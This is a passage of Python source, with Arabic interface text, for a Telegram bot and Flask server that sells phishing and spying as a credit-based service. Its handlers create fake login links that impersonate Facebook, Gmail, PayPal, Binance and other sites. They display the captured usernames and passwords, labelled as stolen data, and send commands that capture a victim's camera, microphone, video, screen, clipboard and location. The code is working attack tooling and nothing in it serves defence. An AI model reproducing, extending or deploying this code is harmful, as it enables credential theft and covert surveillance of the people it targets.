            InlineKeyboardButton("📋 نسخ الرابط", callback_data=f"victim_copy_{victim_id}"),
            InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"victim_rename_{victim_id}"),
        )
        markup.row(
            InlineKeyboardButton("🗑️ حذف", callback_data=f"victim_delete_{victim_id}"),
        )
        markup.row(
            InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="gen_sh"),
        )
        
        bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
        return

    # ============================================================
    # عرض بيانات ضحية
    # ============================================================
    if call.data.startswith("victim_creds_"):
        victim_id = call.data.replace("victim_creds_", "")
        creds = get_victim_creds(victim_id)
        if not creds:
            bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        lines = [f"📥 **البيانات المسروقة ({len(creds)}):**\n"]
        for i, c in enumerate(creds, 1):
            verified = "✅" if c.get("verified") else "❌"
            lines.append(
                f"\n**#{i}** {verified}\n"
                f"👤 `{c.get('username', '')}`\n"
                f"🔑 `{c.get('password', '')}`\n"
                f"🕐 {time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}"
            )
        msg = "\n".join(lines)
        if len(msg) > 4000:
            buf = io.BytesIO(msg.encode('utf-8'))
            buf.name = f'creds_{victim_id[:8]}.txt'
            bot.send_document(chat_id, buf, caption="📥 البيانات")
        else:
            bot.send_message(chat_id, msg, parse_mode="Markdown")
        return

    # ============================================================
    # نسخ رابط ضحية
    # ============================================================
    if call.data.startswith("victim_copy_"):
        victim_id = call.data.replace("victim_copy_", "")
        victim = get_victim(chat_id, victim_id)
        if victim:
            link = f"{PUBLIC_URL}/f/{victim.get('code', '')}"
            bot.send_message(chat_id,
                f"🔗 **رابط الضحية `{victim.get('name', '')}`:**\n\n`{link}`",
                parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    # ============================================================
    # تغيير اسم ضحية
    # ============================================================
    if call.data.startswith("victim_rename_"):
        victim_id = call.data.replace("victim_rename_", "")
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✏️ **أرسل الاسم الجديد:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, lambda m, vid=victim_id: victim_rename_handler(m, vid))
        return

    # ============================================================
    # حذف ضحية (تأكيد)
    # ============================================================
    if call.data.startswith("victim_delete_"):
        victim_id = call.data.replace("victim_delete_", "")
        victim = get_victim(chat_id, victim_id)
        if victim:
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("✅ نعم", callback_data=f"victim_confirm_delete_{victim_id}"),
                InlineKeyboardButton("❌ إلغاء", callback_data=f"victim_{victim_id}"),
            )
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id,
                f"⚠️ **حذف ضحية `{victim.get('name', '')}`؟**\n\n"
                f"سيتم حذف جميع بياناتها نهائياً.",
                reply_markup=markup, parse_mode="Markdown")
        return

    if call.data.startswith("victim_confirm_delete_"):
        victim_id = call.data.replace("victim_confirm_delete_", "")
        delete_victim(chat_id, victim_id)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
        bot.send_message(chat_id, "✅ تم حذف الضحية.")
        return

    # ============================================================
    # اختيار موقع ضحية جديدة
    # ============================================================
    if call.data.startswith("victim_site_"):
        site = call.data.replace("victim_site_", "")
        
        # استرجع الاسم المؤقت
        name = "ضحية"
        if redis_client:
            temp = redis_client.get(f"pending_victim_name:{chat_id}")
            if temp:
                name = temp
        
        # افحص الصلاحيات
        check = can_use_tool(chat_id, "sh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            return
        consume_usage(chat_id, "sh")
        
        # أنشئ الضحية
        victim = create_victim(chat_id, name, site)
        if not victim:
            bot.answer_callback_query(call.id, "❌ فشل الإنشاء", show_alert=True)
            return
        
        # احذف الاسم المؤقت
        if redis_client:
            redis_client.delete(f"pending_victim_name:{chat_id}")
        
        bot.answer_callback_query(call.id, "✅ تم إنشاء الضحية")
        
        site_names = {
            "facebook": "فيسبوك", "instagram": "انستقرام",
            "tiktok": "تيك توك", "twitter": "تويتر / X",
            "gmail": "جيميل", "snapchat": "سناب شات",
            "linkedin": "لينكد إن", "discord": "ديسكورد",
            "telegram": "تلجرام", "netflix": "نتفليكس",
            "paypal": "باي بال", "binance": "بينانس",
        }
        
        target_link = f"{PUBLIC_URL}/f/{victim['code']}"
        
        bot.send_message(
            chat_id,
            f"🎉 **ضحية جديدة جاهزة!**\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"📛 **الاسم:** `{name}`\n"
            f"🌐 **الموقع:** {site_names.get(site, site)}\n"
            f"🔗 **الرابط:**\n`{target_link}`\n\n"
            f"📊 **ما سيحدث:**\n"
            f"• الضحية تفتح الرابط\n"
            f"• تسجّل بياناتها الحقيقية\n"
            f"• **تُرسل لك فقط البيانات الصحيحة!**\n\n"
            f"💡 **ارجع لـ 🍪 لمشاهدة جميع ضحاياك**",
            parse_mode="Markdown"
        )
        return

    # ============================================================
    # أوامر sh_ الأخرى
    # ============================================================
    if call.data.startswith("sh_"):
        parts = call.data.split("_", 2)
        cmd = parts[1] if len(parts) > 1 else ""
        sid = parts[2] if len(parts) > 2 else None

        if cmd == "creds":
            data = get_sh_data(sid)
            creds = data.get("credentials", [])
            if creds:
                lines = [f"🎯 **البيانات ({len(creds)}):**\n"]
                for i, c in enumerate(creds, 1):
                    lines.append(f"\n**#{i}**\n👤 `{c.get('username', '')}`\n🔑 `{c.get('password', '')}`")
                bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
            else:
                bot.answer_callback_query(call.id, "لا توجد بيانات", show_alert=True)
        elif cmd == "stats":
            bot.answer_callback_query(call.id, "استخدم قائمة الضحايا", show_alert=True)
        return

    # ============================================================
    # RAT أوامر
    # ============================================================
    if call.data.startswith("rat_cam_"):
        target_chat_id = call.data.replace("rat_cam_", "")
        queue_command(target_chat_id, "snapshot")
        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة...")
        return

    if call.data.startswith("rat_mic_"):
        target_chat_id = call.data.replace("rat_mic_", "")
        queue_command(target_chat_id, "audio")
        bot.answer_callback_query(call.id, "⏳ جاري التسجيل...")
        return

    # ============================================================
    # LSH أوامر
    # ============================================================
    if call.data.startswith("lsh_snap_"):
        sid = call.data.replace("lsh_snap_", "")
        ok = lsh_push_command(sid, {"action": "snapshot"})
        bot.answer_callback_query(call.id, "📸" if ok else "❌", show_alert=not ok)
        return

    if call.data.startswith("lsh_audio_"):
        sid = call.data.replace("lsh_audio_", "")
        ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
        bot.answer_callback_query(call.id, "🎙️" if ok else "❌", show_alert=not ok)
        return

    if call.data.startswith("lsh_video_"):
        sid = call.data.replace("lsh_video_", "")
        ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
        bot.answer_callback_query(call.id, "🎥" if ok else "❌", show_alert=not ok)
        return

    if call.data.startswith("lsh_screen_"):
        sid = call.data.replace("lsh_screen_", "")
        ok = lsh_push_command(sid, {"action": "screen"})
        bot.answer_callback_query(call.id, "🖥️" if ok else "❌", show_alert=not ok)
        return

    if call.data.startswith("lsh_clip_"):
        sid = call.data.replace("lsh_clip_", "")
        ok = lsh_push_command(sid, {"action": "clipboard"})
        bot.answer_callback_query(call.id, "📋" if ok else "❌", show_alert=not ok)
        return

    if call.data.startswith("lsh_loc_"):
        sid = call.data.replace("lsh_loc_", "")
        ok = lsh_push_command(sid, {"action": "location"})
        bot.answer_callback_query(call.id, "📍" if ok else "❌", show_alert=not ok)
        return

    if call.data.startswith("lsh_open_"):
        sid = call.data.replace("lsh_open_", "")
        bot.answer_callback_query(call.id, "🌐 أرسل الرابط")
        _pending_open_url[chat_id] = sid
        bot.send_message(chat_id, "🌐 **أرسل الرابط:**")
        return

    if call.data.startswith("lsh_vibrate_"):
        sid = call.data.replace("lsh_vibrate_", "")
        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500]}})
        bot.answer_callback_query(call.id, "📳" if ok else "❌", show_alert=not ok)
        return

    if call.data.startswith("lsh_kill_"):
        sid = call.data.replace("lsh_kill_", "")
        ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
        bot.answer_callback_query(call.id, "❌" if ok else "❌", show_alert=not ok)
        return


# ============================================================
# ★★★ معالجات الضحايا (Next Step) ★★★
# ============================================================
def victim_name_handler(message):
    """استقبل اسم الضحية ثم اعرض المواقع"""
    if not message.text:
        return
    name = message.text.strip()[:50]
    chat_id = message.chat.id
    
    if redis_client:
        try:
            redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
        except: pass
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📘 Facebook", callback_data="victim_site_facebook"),
        InlineKeyboardButton("📷 Instagram", callback_data="victim_site_instagram"),
    )
    markup.row(
        InlineKeyboardButton("🎵 TikTok", callback_data="victim_site_tiktok"),
        InlineKeyboardButton("🐦 Twitter/X", callback_data="victim_site_twitter"),
    )
    markup.row(
        InlineKeyboardButton("📧 Gmail", callback_data="victim_site_gmail"),
        InlineKeyboardButton("👻 Snapchat", callback_data="victim_site_snapchat"),
    )
    markup.row(
        InlineKeyboardButton("💼 LinkedIn", callback_data="victim_site_linkedin"),
        InlineKeyboardButton("🎮 Discord", callback_data="victim_site_discord"),
    )
    markup.row(
        InlineKeyboardButton("✈️ Telegram", callback_data="victim_site_telegram"),
        InlineKeyboardButton("🎬 Netflix", callback_data="victim_site_netflix"),
    )
    markup.row(
        InlineKeyboardButton("💳 PayPal", callback_data="victim_site_paypal"),
        InlineKeyboardButton("💰 Binance", callback_data="victim_site_binance"),
    )
    
    bot.send_message(
        chat_id,
        f"👤 **اسم الضحية:** `{name}`\n\n"
        f"🎯 **اختر الموقع:**",
        reply_markup=markup,
        parse_mode="Markdown"
    )


def victim_rename_handler(message, victim_id):
    if not message.text:
        return
    new_name = message.text.strip()[:50]
    chat_id = message.chat.id
    rename_victim(chat_id, victim_id, new_name)
    bot.send_message(chat_id, f"✅ **تم تغيير الاسم إلى:** `{new_name}`", parse_mode="Markdown")


# ============================================================
# معالجات الأدمن
# ============================================================
def admin_search_handler(message):
    if not is_admin(message.chat.id): return
    query = (message.text or "").strip().lstrip("@")
    users = get_all_users()
    found = [u for u in users if str(u.get("user_id")) == query or (u.get("username", "") or "").lower() == query.lower()]
    if not found:
        bot.send_message(message.chat.id, f"❌ لم يتم العثور على: `{query}`", parse_mode="Markdown")
        return
    for u in found:
        uid = u.get("user_id")
        bot.send_message(message.chat.id, build_user_info_text(uid, u),
                         reply_markup=build_user_detail_keyboard(uid, u), parse_mode="Markdown")


def admin_broadcast_handler(message):
    if not is_admin(message.chat.id): return
    text = message.text
    if not text: return
    users = get_all_users()
    success = failed = 0
    status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)}...")
    for u in users:
        uid = u.get("user_id")
        if u.get("is_banned"): continue
        try:
            bot.send_message(uid, f"📢 **رسالة من الإدارة:**\n\n{text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.05)
        except: failed += 1
    try:
        bot.edit_message_text(f"✅ **تم!**\n✔️ {success}\n❌ {failed}",
            chat_id=message.chat.id, message_id=status_msg.message_id)
    except: pass


def admin_ban_handler(message):
    if not is_admin(message.chat.id): return
    try: uid = int((message.text or "").strip())
    except: return
    ban_user(uid)
    bot.send_message(message.chat.id, f"🚫 تم حظر `{uid}`", parse_mode="Markdown")


def admin_unban_handler(message):
    if not is_admin(message.chat.id): return
    try: uid = int((message.text or "").strip())
    except: return
    unban_user(uid)
    bot.send_message(message.chat.id, f"✅ تم فك حظر `{uid}`", parse_mode="Markdown")


def admin_delete_handler(message):
    if not is_admin(message.chat.id): return
    try: uid = int((message.text or "").strip())
    except: return
    delete_user(uid)
    bot.send_message(message.chat.id, f"🗑️ تم حذف `{uid}`", parse_mode="Markdown")


def admin_grant_vip_handler(message):
    if not is_admin(message.chat.id): return
    try: uid = int((message.text or "").strip())
    except: return
    user = get_or_create_user(uid)
    user["is_vip"] = True
    save_user(uid, user)
    bot.send_message(message.chat.id, f"💎 تم منح VIP لـ `{uid}`", parse_mode="Markdown")
    try:
        bot.send_message(uid, "💎 **تهانينا!** تم منحك VIP! 🚀", parse_mode="Markdown")
    except: pass


def admin_give_stars_handler(message):
    if not is_admin(message.chat.id): return
    try:
        parts = (message.text or "").split("|")
        uid = int(parts[0].strip())
        amount = int(parts[1].strip())
    except:
        bot.send_message(message.chat.id, "❌ صيغة خاطئة")
        return
    user = get_or_create_user(uid)
    user["total_stars_spent"] = max(0, user.get("total_stars_spent", 0) - amount)
    save_user(uid, user)
    bot.send_message(message.chat.id, f"⭐ تم إعطاء `{amount}` نجمة لـ `{uid}`", parse_mode="Markdown")


def admin_msg_user_handler(message, uid):
    if not is_admin(message.chat.id): return
    try:
        bot.send_message(uid, f"📨 **من الإدارة:**\n\n{message.text}", parse_mode="Markdown")
        bot.send_message(message.chat.id, f"✅ تم الإرسال", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ {e}")


# ============================================================
# معالجة الرابط المُدخل (LSH)
# ============================================================
_pending_open_url = {}


@bot.message_handler(func=lambda m: m.chat.id in _pending_open_url and m.text and m.text.startswith("http"))
def handle_open_url(message):
    sid = _pending_open_url.pop(message.chat.id, None)
    if sid:
        ok = lsh_push_command(sid, {"action": "url", "payload": {"url": message.text}})
        bot.send_message(message.chat.id, "✅ تم الإرسال" if ok else "❌ فشل")


# ============================================================
# تشغيل البوت
# ============================================================
def run_telegram_bot():
    print("[+] ============================================")
    print("[+] Starting Telegram Bot polling...")
    print(f"[+] Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    print("[+] ============================================")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            params={"drop_pending_updates": "true"},
            timeout=15,
        )
        print(f"[+] deleteWebhook HTTP {r.status_code}")
    except Exception as e:
        print(f"[-] deleteWebhook: {e}")

    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=15)
        print(f"[+] getMe: {r.text[:200]}")
    except Exception as e:
        print(f"[-] getMe: {e}")

    print("[+] Starting infinity_polling loop...")
    attempt = 0
    while True:
        try:
            attempt += 1
            print(f"[+] Polling attempt #{attempt}")
            bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30, none_stop=True)
        except Exception as e:
            print(f"[-] Polling crashed: {e}")
            time.sleep(5)


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()
    time.sleep(2)

    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Flask Web Server starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
